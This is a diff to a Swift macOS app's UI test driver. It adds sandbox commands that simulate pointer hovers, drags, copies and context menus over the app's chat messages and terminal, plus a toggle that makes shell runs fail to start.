         case "sheet": showSheet(rest, reply)
         case "boost":
             let now = Date().timeIntervalSince1970
@@ -2040,6 +2262,10 @@ private final class Driver: NSObject, NSApplicationDelegate {
             boostWatch.look { [weak self] in self?.settle { reply(true, self?.boostWatch.state?.text ?? "not decided") } }
         case "shell-ask": shellAsk(rest, reply)
         case "shell-click": shellClick(rest, reply)
+        case "shell-fail":
+            guard rest == "on" || rest == "off" else { return reply(false, "shell-fail on|off") }
+            shellLaunchFails = rest == "on"
+            reply(true, "shell requests' Runs \(shellLaunchFails ? "fail to start" : "start")")
         case "wallet-ask": walletAsk(Array(words.dropFirst()), reply)
         case "wallet-card": let (ok, text) = walletCardText(); reply(ok, text)
         case "wallet-later":
@@ -2087,6 +2313,7 @@ private final class Driver: NSObject, NSApplicationDelegate {
             }
             reply(true, "closed \(rest)")
         case "shot": shot(rest.isEmpty ? "shot" : rest, reply)
+        case "pointer": pointer(Array(words.dropFirst()), reply)
         case "unproved":
             key.stranger = SymmetricKey(size: .bits256)
             host.confirmKeyReset = { _, _ in false }
@@ -2099,6 +2326,264 @@ private final class Driver: NSObject, NSApplicationDelegate {
             reply(true, Self.commands.map { "\($0.name): \($0.help)" }.joined(separator: "\n"))
         default:
             reply(false, "no command \(words[0]); these are:\n" + Self.commands.map { "  \($0.name): \($0.help)" }.joined(separator: "\n"))
+        }
+    }
+
+    // MARK: The pointer over the chat
+
+    /// The shown chat's message text views, top to bottom, each writing to the sandbox's own pasteboard.
+    private func chatTexts() -> [ChatTextView] {
+        guard let root = window?.window?.contentView else { return [] }
+        var found: [ChatTextView] = []
+        func walk(_ view: NSView) {
+            if let text = view as? ChatTextView { found.append(text); return }
+            view.subviews.forEach(walk)
+        }
+        walk(root)
+        for text in found where text.pasteboard == .general { text.pasteboard = sandboxPasteboard }
+        return found.sorted { $0.convert($0.bounds, to: nil).maxY > $1.convert($1.bounds, to: nil).maxY }
+    }
+
+    private let sandboxPasteboard = NSPasteboard(name: NSPasteboard.Name("VibeSwitcherSandbox-\(getpid())"))
+
+    /// A point (in the window) on the first line of the message holding `text`: on that text when found, else its start.
+    private func point(onMessage text: String) -> (ChatTextView, NSPoint)? {
+        guard let view = chatTexts().first(where: { $0.string.localizedCaseInsensitiveContains(text) }),
+              let layout = view.layoutManager, let container = view.textContainer else { return nil }
+        let at = (view.string as NSString).range(of: text, options: .caseInsensitive)
+        let glyphs = layout.glyphRange(forCharacterRange: NSRange(location: at.location, length: min(max(at.length, 1), 3)), actualCharacterRange: nil)
+        let rect = layout.boundingRect(forGlyphRange: glyphs, in: container)
+        return (view, view.convert(NSPoint(x: rect.minX + 1, y: rect.midY), to: nil))
+    }
+
+    private func mouseEvent(_ type: NSEvent.EventType, at point: NSPoint, clicks: Int = 1) -> NSEvent? {
+        NSEvent.mouseEvent(with: type, location: point, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
+                           windowNumber: window?.window?.windowNumber ?? 0, context: nil, eventNumber: 0, clickCount: clicks,
+                           pressure: type == .leftMouseDown || type == .rightMouseDown ? 1 : 0)
+    }
+
+    private func describe(_ view: NSView?) -> String {
+        guard let view else { return "nothing" }
+        return String(describing: type(of: view)).prefix(60).description
+    }
+
+    /// `pointer rows|areas TEXT|hover TEXT|hover-beside TEXT|drag FROM TO|drag-window FROM TO|copy|menu TEXT`.
+    private func pointer(_ words: [String], _ reply: @escaping (Bool, String) -> Void) {
+        guard let nsWindow = window?.window, let content = nsWindow.contentView else { return reply(false, "no window") }
+        let what = words.first ?? "rows"
+        let rest = words.dropFirst().joined(separator: " ")
+        switch what {
+        case "rows":
+            let lines = chatTexts().map { text -> String in
+                let frame = text.convert(text.bounds, to: nil)
+                let shown = !text.visibleRect.isEmpty && text.visibleRect.intersects(text.bounds)
+                return "\(shown ? "on screen " : "off screen")  y \(Int(frame.minY))…\(Int(frame.maxY))  tooltip \(text.toolTip ?? "none")  “\(text.string.prefix(40).replacingOccurrences(of: "\n", with: " "))”"
+            }
+            reply(true, lines.isEmpty ? "no messages shown" : lines.joined(separator: "\n"))
+        case "hover", "hover-beside":
+            // hover: onto the message's text; hover-beside: 15 pt left of it (a reply's mark, a prompt bubble's edge).
+            guard let (view, onText) = point(onMessage: rest) else { return reply(false, "no message holds \(rest)") }
+            let at = what == "hover" ? onText : NSPoint(x: view.convert(view.bounds, to: nil).minX - 15, y: onText.y)
+            let frame = content.superview ?? content
+            let hit = frame.hitTest(frame.convert(at, from: nil))
+            // As AppKit hands the pointer's moves to the tracking areas' owners (here, SwiftUI's hosting views).
+            // First a mouseEntered: naming the area (its tracking number is the area, as the window's are), then the moves.
+            var owners: [NSResponder] = []
+            var current: NSView? = hit
+            while let v = current {
+                for area in v.trackingAreas where area.options.contains(.mouseMoved) && (area.options.contains(.inVisibleRect) || area.rect.contains(v.convert(at, from: nil))) {
+                    guard let owner = area.owner as? NSResponder, !owners.contains(where: { $0 === owner }) else { continue }
+                    owners.append(owner)
+                    if let entered = NSEvent.enterExitEvent(with: .mouseEntered, location: at, modifierFlags: [], timestamp: ProcessInfo.processInfo.systemUptime,
+                                                            windowNumber: nsWindow.windowNumber, context: nil, eventNumber: 0,
+                                                            trackingNumber: Int(bitPattern: Unmanaged.passUnretained(area).toOpaque()), userData: nil) {
+                        owner.mouseEntered(with: entered)
+                    }
+                }
+                current = v.superview
+            }
+            for dx in [-2.0, -1, 0] {
+                guard let moved = mouseEvent(.mouseMoved, at: NSPoint(x: at.x + dx, y: at.y)) else { continue }
+                owners.forEach { $0.mouseMoved(with: moved) }
+            }
+            settle { reply(true, "pointer at \(Int(at.x)),\(Int(at.y)) on \(self.describe(hit)), moves to \(owners.map { String(describing: type(of: $0)).prefix(30) }); the message's tooltip now \(view.toolTip ?? "none")") }
+        case "drag", "drag-window":
+            guard words.count >= 3, let (from, start) = point(onMessage: words[1]), let (_, end) = point(onMessage: words[2...].joined(separator: " ")) else {
+                return reply(false, "drag FROM TO: each a text one of the shown messages holds")
+            }
+            let frame = content.superview ?? content
+            let hit = frame.hitTest(frame.convert(start, from: nil))
+            guard let down = mouseEvent(.leftMouseDown, at: start) else { return reply(false, "no event") }
+            // The drag's moves 50 ms apart, as a hand's come (the run loop turns between them: SwiftUI updates, the chat
+            // scrolls), then the button up there; it holds still there 0.5 s first when the end is off the chat's view.
+            let moves = (1...12).compactMap { step -> NSEvent? in
+                let t = Double(step) / 12
+                return mouseEvent(.leftMouseDragged, at: NSPoint(x: start.x + (end.x + 30 - start.x) * t, y: start.y + (end.y - start.y) * t))
+            }
+            // Run loop timers, in the common modes: the drag's tracking loop turns the run loop in its own, and this
+            // command runs in a block of the main queue, which runs no other block until it's done.
+            func later(_ delay: TimeInterval, _ event: NSEvent) {
+                let timer = Timer(timeInterval: delay, repeats: false) { _ in NSApp.postEvent(event, atStart: false) }
+                RunLoop.main.add(timer, forMode: .common)
+            }
+            for (index, move) in moves.enumerated() { later(0.05 * Double(index + 1), move) }
+            let offView = !(content.bounds.contains(content.convert(end, from: nil)))
+            if let up = mouseEvent(.leftMouseUp, at: NSPoint(x: end.x + 30, y: end.y)) {
+                later(0.05 * Double(moves.count + 1) + (offView ? 0.5 : 0), up)
+            }
+            // As the window hands a press to the view under it (the window isn't key: a key one does the same).
+            // drag-window: through the window's sendEvent, as the window server's event comes (a window not key takes a
+            // first click to become key unless the view under it accepts first mouse).
+            if what == "drag-window" { nsWindow.sendEvent(down) } else { hit?.mouseDown(with: down) }
+            settle {
+                let focused = nsWindow.firstResponder as? ChatTextView
+                let selected = focused?.selectedPlainText() ?? ""
+                reply(!selected.isEmpty, "window key \(nsWindow.isKeyWindow), pressed on \(self.describe(hit)) (first mouse \(hit?.acceptsFirstMouse(for: down) ?? false)) (the message's text view: \(hit === from)), first responder \(self.describe(nsWindow.firstResponder as? NSView)); selected: “\(selected)”")
+            }
+        case "copy":
+            _ = chatTexts()
+            sandboxPasteboard.clearContents()
+            // Only a message's own text view: it writes to the sandbox's pasteboard, anything else to the general one.
+            guard let focused = nsWindow.firstResponder as? ChatTextView else {
+                return reply(false, "the first responder is \(describe(nsWindow.firstResponder as? NSView)), not a message: not copied")
+            }
+            // ⌘C as the main menu has it, sent to the window's first responder (the window isn't key, so not through NSApp's key window).
+            // (The sandbox puts up no menu bar: the app's own menu, as AppDelegate installs it.)
+            let item = MainMenu.build().items.compactMap(\.submenu).flatMap(\.items).first { $0.keyEquivalent == "c" && $0.keyEquivalentModifierMask == .command }
+            let handled = item.flatMap(\.action).map { NSApp.sendAction($0, to: focused, from: item) } ?? false
+            let copied = sandboxPasteboard.string(forType: .string)
+            reply(copied != nil, "menu item \(item?.title ?? "none"), handled \(handled), first responder \(describe(nsWindow.firstResponder as? NSView)); copied: “\(copied ?? "")”")
+        case "areas":
+            // The tracking areas over the message holding TEXT, from its view up to the window, and each owner's kind.
+            guard let (view, at) = point(onMessage: rest) else { return reply(false, "no message holds \(rest)") }
+            var lines: [String] = []
+            var current: NSView? = view
+            while let v = current {
+                let local = v.convert(at, from: nil)
+                for recognizer in v.gestureRecognizers {
+                    lines.append("\(describe(v)): recognizer \(String(describing: type(of: recognizer)).prefix(60)) delays primary \(recognizer.delaysPrimaryMouseButtonEvents) enabled \(recognizer.isEnabled)")
+                }
+                for area in v.trackingAreas where area.rect.contains(local) || area.options.contains(.inVisibleRect) {
+                    lines.append("\(describe(v)): owner \(area.owner.map { String(describing: type(of: $0)).prefix(50).description } ?? "none") options \(String(area.options.rawValue, radix: 16))")
+                }
+                current = v.superview
+            }
+            reply(true, lines.joined(separator: "\n"))
+        case "menu":
+            guard let (_, at) = point(onMessage: rest) else { return reply(false, "no message holds \(rest)") }
+            let frame = content.superview ?? content
+            let hit = frame.hitTest(frame.convert(at, from: nil))
+            guard let event = mouseEvent(.rightMouseDown, at: at), let menu = hit?.menu(for: event) else {
+                return reply(false, "no menu on \(describe(hit))")
+            }
+            reply(true, "on \(describe(hit)): " + menu.items.map { $0.isSeparatorItem ? "—" : $0.title }.joined(separator: ", "))
+        default:
+            reply(false, "pointer rows|areas TEXT|hover TEXT|hover-beside TEXT|drag FROM TO|drag-window FROM TO|copy|menu TEXT")
+        }
+    }
+
+    // MARK: The terminal's mouse and Edit menu
+
+    /// The shown terminal, its window and what it reads as now.
+    private func shownTerminal() -> (HostTerminalView, NSWindow)? {
+        guard let terminal = window?.pane.currentView, let shown = terminal.window, !terminal.isHiddenOrHasHiddenAncestor else { return nil }
+        return (terminal, shown)
+    }
+
+    private func terminalState(_ terminal: HostTerminalView) -> String {
+        let shown = terminal.window
+        let responder = shown?.firstResponder.map { String(describing: type(of: $0)) } ?? "none"
+        let selected = terminal.selection.active ? "“\(terminal.selection.getSelectedText())”" : "nothing"
+        return "keyboard: \(shown?.firstResponder === terminal ? "the terminal" : responder); mouse mode \(terminal.getTerminal().mouseMode); selected: \(selected)"
+    }
+
+    /// A drag from the first line's start to the second line's 30th column, given to the view the window's hit test finds
+    /// there, as the window gives a click (so whatever covers the terminal takes it, as it would yours).
+    private func dragInTerminal(_ keys: Set<String>, _ reply: @escaping (Bool, String) -> Void) {
+        guard let (terminal, shown) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
+        var flags: NSEvent.ModifierFlags = []
+        if keys.contains("option") { flags.insert(.option) }
+        if keys.contains("shift") { flags.insert(.shift) }
+        if keys.contains("command") { flags.insert(.command) }
+        let screen = terminal.getTerminal()
+        let cell = NSSize(width: terminal.bounds.width / CGFloat(max(screen.cols, 1)), height: terminal.bounds.height / CGFloat(max(screen.rows, 1)))
+        func point(col: Int, row: Int) -> NSPoint {
+            terminal.convert(NSPoint(x: (CGFloat(col) + 0.5) * cell.width, y: terminal.bounds.height - (CGFloat(row) + 0.5) * cell.height), to: nil)
+        }
+        let start = point(col: 0, row: 0)
+        let hit = shown.contentView?.superview?.hitTest(start)
+        let hitName = hit.map { $0 === terminal ? "the terminal" : $0.isDescendant(of: terminal) ? "inside the terminal (\(type(of: $0)))" : String(describing: type(of: $0)) } ?? "nothing"
+        let before = terminalState(terminal)
+        var number = 0
+        func send(_ type: NSEvent.EventType, _ location: NSPoint) {
+            number += 1
+            guard let event = NSEvent.mouseEvent(with: type, location: location, modifierFlags: flags, timestamp: ProcessInfo.processInfo.systemUptime,
+                                                 windowNumber: shown.windowNumber, context: nil, eventNumber: number, clickCount: 1,
+                                                 pressure: type == .leftMouseUp ? 0 : 1) else { return }
+            // To the view the click hits, as the window hands it on: the window itself drops a made-up click in an app
+            // that isn't active (the sandbox never is).
+            guard let target = hit else { return }
+            switch type {
+            case .leftMouseDown: target.mouseDown(with: event)
+            case .leftMouseDragged: target.mouseDragged(with: event)
+            default: target.mouseUp(with: event)
+            }
+        }
+        send(.leftMouseDown, start)
+        for col in stride(from: 5, through: 30, by: 5) { send(.leftMouseDragged, point(col: col, row: col < 30 ? 0 : 1)) }
+        send(.leftMouseUp, point(col: 30, row: 1))
+        settle { reply(true, "the click hit \(hitName)\nbefore: \(before)\nafter: \(self.terminalState(terminal))") }
+    }
+
+    /// ⌘KEY as the menu bar takes it: the window's own key equivalents first, then the menu's item, sent up the
+    /// responder chain from the first responder to the first that takes the action and enables it (the sandbox's
+    /// window is never key, so AppKit's own lookup would start nowhere).
+    private func pressMenuKey(_ key: String, _ reply: @escaping (Bool, String) -> Void) {
+        guard let (terminal, shown) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
+        let menu = NSApp.mainMenu ?? MainMenu.build()
+        func find(_ menu: NSMenu) -> NSMenuItem? {
+            for item in menu.items {
+                if item.keyEquivalent == key, item.keyEquivalentModifierMask == .command { return item }
+                if let sub = item.submenu, let found = find(sub) { return found }
+            }
+            return nil
+        }
+        guard let item = find(menu), let action = item.action else { return reply(false, "no menu item for ⌘\(key)") }
+        var responder: NSResponder? = shown.firstResponder
+        var chain: [String] = []
+        while let next = responder, !next.responds(to: action) {
+            chain.append(String(describing: type(of: next)))
+            responder = next.nextResponder
+        }
+        guard let target = responder else { return reply(false, "⌘\(key) (\(item.title)): nothing in the chain takes it: \(chain.joined(separator: " → "))") }
+        let enabled = (target as? NSMenuItemValidation)?.validateMenuItem(item)
+            ?? (target as? NSUserInterfaceValidations)?.validateUserInterfaceItem(item) ?? true
+        let who = target === terminal ? "the terminal" : String(describing: type(of: target))
+        guard enabled else { return reply(true, "⌘\(key) (\(item.title)): \(who) takes it, disabled now\n\(terminalState(terminal))") }
+        NSApp.sendAction(action, to: target, from: item)
+        let id = window?.pane.current
+        DispatchQueue.main.asyncAfter(deadline: .now() + 0.6) { [weak self] in
+            guard let self else { return }
+            let lines = id.map { self.window?.pane.screenLines($0).suffix(3).joined(separator: " ⏎ ") ?? "" } ?? ""
+            reply(true, "⌘\(key) (\(item.title)) went to \(who)\npasteboard: “\(NSPasteboard.general.string(forType: .string) ?? "")”\n"
+                + "\(self.terminalState(terminal))\nlast lines: \(lines)")
+        }
+    }
+
+    /// The shown session's program turns mouse reporting on or off: a fake Claude prints it; a shell's view reads it
+    /// as if its program had.
+    private func mouseReporting(_ on: Bool, _ reply: @escaping (Bool, String) -> Void) {
+        guard let (terminal, _) = shownTerminal() else { return reply(false, "no terminal shown: select a session and show its terminal (terminal)") }
+        let codes = on ? "\u{1b}[?1002h\u{1b}[?1006h" : "\u{1b}[?1002l\u{1b}[?1006l"
+        if let fake = fakeList.first(where: { $0.id == window?.pane.current }), fake.control != nil {
+            let file = state.appendingPathComponent("mouse-\(on ? "on" : "off")")
+            try? VibePaths.writePrivate(Data(codes.utf8), to: file)
+            tellFake(fake, #"{"op": "print", "file": "\#(file.path)"}"#)
+        } else {
+            terminal.feed(text: codes)
+        }
+        waitFor({ (terminal.getTerminal().mouseMode != .off) == on }) { done in
+            reply(done, "mouse mode \(terminal.getTerminal().mouseMode)")
         }
     }
 
@@ -2328,11 +2813,18 @@ private final class Driver: NSObject, NSApplicationDelegate {
         }.first
         guard let runnable else { return reply(false, "no code block with a Run in the chat's replies") }
         closeSheet()
+        guard let way = chat.runner.way else { return reply(false, "no Run shown: the selected session takes no commands") }
         if confirmed {
-            let ran = RunButton.run(runnable, with: chat.runner, confirm: { _ in true })
-            return settle { reply(ran, ran ? "ran it: \(runnable.prompt)" : "it couldn't be typed into the session") }
+            return RunButton.run(runnable, way: way, with: chat.runner, confirm: { _ in true }) { [weak self] outcome in
+                guard let self else { return }
+                switch outcome {
+                case .ran?: self.settle { reply(true, "ran it: \(runnable.typed(way))") }
+                case .refused(let reason)?: self.settle { reply(false, reason) }
+                case nil: reply(false, "cancelled")
+                }
+            }
         }
-        let alert = RunButton.confirmation(runnable)
+        let alert = RunButton.confirmation(runnable, way: way)
         alert.layout()
         let shown = alert.window
         Sandbox.hide(shown)
